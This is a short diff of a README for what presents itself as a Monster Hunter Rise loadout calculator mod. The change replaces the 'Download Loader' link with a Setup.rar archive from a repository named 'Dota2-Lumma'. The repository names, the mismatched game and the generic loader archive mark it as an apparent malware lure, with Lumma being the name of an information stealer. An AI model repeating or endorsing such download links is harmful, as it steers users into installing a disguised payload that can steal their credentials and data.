@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Monster Hunter Rise Loadout Calculator
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Monster-Hunter-Rise-Loadout-Calculator` · Updated: 2026-10-05
 
 **Tags:** `monster-hunter-rise` `loadout-calculator` `action-rpg` `weapons` `armor`
+
 
 
 
